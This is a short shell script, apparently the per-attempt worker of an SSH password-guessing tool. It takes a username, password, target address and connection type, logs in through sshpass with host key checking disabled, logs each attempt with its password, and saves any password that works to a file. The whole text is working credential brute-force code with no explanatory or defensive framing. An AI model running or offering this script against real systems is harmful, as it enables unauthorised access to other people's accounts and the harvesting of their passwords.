
USUARIO=$1
PASSWORD=$2
DIRECCION=$3
CONEXION=$4

fichero_password=tmp/PASSWORD.txt
fichero_intentos=tmp/INTENTOS.txt

TIPO_CONEXION=$(echo ${CONEXION} | tr '[:upper:]' '[:lower:]')

sshpass -p $PASSWORD $TIPO_CONEXION -o StrictHostKeyChecking=no $USUARIO@$DIRECCION "pwd" > /dev/null

conexion=$?

echo "[$USUARIO@$DIRECCION] [$conexion] [$PASSWORD]" >> $fichero_intentos

if [ ! $conexion -gt 0 ];then
    echo "PASSWORD: $PASSWORD" >> $fichero_password
fi

